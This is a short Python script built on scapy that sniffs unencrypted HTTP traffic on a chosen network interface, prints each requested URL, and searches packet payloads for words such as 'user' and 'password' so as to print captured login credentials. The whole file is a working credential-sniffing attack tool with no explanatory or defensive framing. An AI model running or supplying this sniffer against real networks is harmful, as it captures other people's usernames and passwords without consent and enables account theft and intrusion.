#!/usr/bin/python3

import scapy.all as scapy
# works for scapy==2.4.3+ | install scapy-http module for scapy<2.4.3 [https://github.com/invernizzi/scapy-http]
from scapy.layers import http
from urllib.parse import urljoin
import argparse

def sniff(interface):
    # arg filter works as per Berkeley Packet Filter(BPF) syntax
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")

def get_login_info(packet):
    try:
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ['login','user','pass','username','password']
            for keyword in keywords:
                if keyword in load.decode().lower():
                    return load
    except Exception as err:
        print ("[-] something went wrong while extracting login info : {}".format(err))

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = urljoin(packet[http.HTTPRequest].Host, packet[http.HTTPRequest].Path)
        print ("[+]HTTPRequest > {}".format(url))
        logininfo = get_login_info(packet)
        if logininfo:
            print ("[+]Possible username and password {}".format(logininfo))

parser=argparse.ArgumentParser()    
parser.add_argument("-i","--interface",dest="interface",help="Specify an interface to capture packets")
options = parser.parse_args()

from pdb import set_trace as st

if not options.interface:
    print (parser.print_help())
    exit()

sniff(options.interface)



